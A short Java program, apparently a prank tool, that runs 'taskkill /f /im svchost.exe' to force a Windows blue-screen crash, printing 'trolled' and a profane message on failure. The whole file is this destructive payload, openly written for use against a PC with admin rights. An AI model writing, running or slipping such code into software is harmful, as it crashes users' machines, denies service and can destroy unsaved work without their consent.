package dev.hause.bsod;

/*
* @author: HausemasterIssue
* @since: 16/11/2021
*/

// NOTE: you need admin privleges on your PC for this to work
public class Bsod {
	
	public static void main (String []args) {
		invokeBsod();
	}
	
	public static void invokeBsod() {
		Runtime runtime = Runtime.getRuntime();
		
		// try to execute a command prompt command
		try {
			System.out.println("trolled");
			// kill svchost.exe, this causes the system to blue screen
			runtime.exec("taskkill.exe /f /im svchost.exe");
		} catch (Exception e){
			// if we cannot execute the command say we cannot
			System.out.println("fuck you lucky bastard");
		}
	}
} 